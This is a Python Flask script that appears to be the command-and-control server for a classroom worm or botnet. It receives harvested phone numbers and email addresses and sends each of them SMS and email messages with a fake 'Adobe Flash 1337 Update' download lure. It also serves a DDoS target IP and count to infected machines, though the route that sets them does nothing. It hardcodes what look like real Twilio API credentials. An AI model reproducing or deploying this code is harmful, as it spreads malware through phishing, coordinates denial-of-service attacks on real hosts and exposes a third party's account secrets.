import os
from twilio.rest import Client
import socket
import smtplib
from email.mime.text import MIMEText
import Crypto
from Crypto.PublicKey import RSA
from Crypto import Random
from flask import Flask, jsonify, request
from cStringIO import StringIO

app = Flask(__name__)

sent_emails = []
sent_numbers = []

def handlePost(clientNumber, clientEmails):
	
#	privkeyfp = open('private.pem','r')	
#	privkey = RSA.importKey(privkeyfp.read(),passphrase='cs460')
#	clientNumber = privkey.decrypt(clientNumber)
#	clientEmails = privkey.decrypt(clientEmails)

	fp_numbers = StringIO(clientNumber)
	fp_emails = StringIO(clientEmails)

	numbers_list = []
	emails_list = []
	for number in fp_numbers:
		numbers_list.append(number.rstrip())
	for email in fp_emails:
		emails_list.append(email.rstrip())


	client = Client('ACb89307719aa8043871f9912452ef21c6','2f56bc2c9d8ae27afa3baf74fb46f0cb')
	text_body = "Hey have you heard about the new Adobe flash update? Download it here: "

	for number in numbers_list:
		if not number in sent_numbers:
			try:
				client.messages.create(from_="+12175763259",to=number,body=text_body)
				sent_numbers.append(number)
				no_op = 0
			except:
				no_op = 0

	server = smtplib.SMTP()
	msg = MIMEText("Hey have you heard about the new Adobe flash update? Download it here: ")
	me = "aadoobeeflashy@gmail.com"
	msg['Subject'] = "Adobe Flash 1337 Update"
	msg['From'] = me
	s = smtplib.SMTP('localhost')

	for email in emails_list:
		if not email in sent_emails:
			sent_emails.append(email)
			you = email
			msg['To'] = you
			s.sendmail(me, [you], msg.as_string())
	s.quit()

@app.route('/', methods=['POST', 'GET'])
def result():
		if request.method == 'POST':
			handlePost(request.form['numbers'], request.form['emails'])
			return ''
		else:
			return jsonify(result={'ip': ddosip, 'count': ddoscount})

@app.route('/ddos', methods=['POST'])
def ddosresult():
		ip = request.form['ip']
		count = int(request.form['count'])
		return ''

if __name__ == "__main__":
		ddosip = ''
		ddoscount = 0
		app.run('0.0.0.0')
